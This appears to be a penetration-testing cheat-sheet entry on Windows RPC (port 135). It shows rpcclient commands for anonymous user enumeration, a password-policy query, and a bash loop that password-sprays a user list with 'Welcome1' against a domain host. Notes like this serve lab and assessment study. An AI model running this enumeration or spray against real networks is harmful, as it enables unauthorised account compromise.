**RPC (Port 135, dynamically assigned high ports)**

- Used for interprocess communication between applications and services.
- RPC Endpoint Mapper listens on **port 135**, and then assigns dynamic ports for communication.
- Often used in Windows for services like **Active Directory, WMI, and DCOM**.

Anonymous Login:

```bash
rpcclient -U'%' 10.10.110.17
enumdomusers
```

Obtain password policy:

```bash
querydominfo
```

Password Spray with a single password:

```bash
for u in $(cat users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```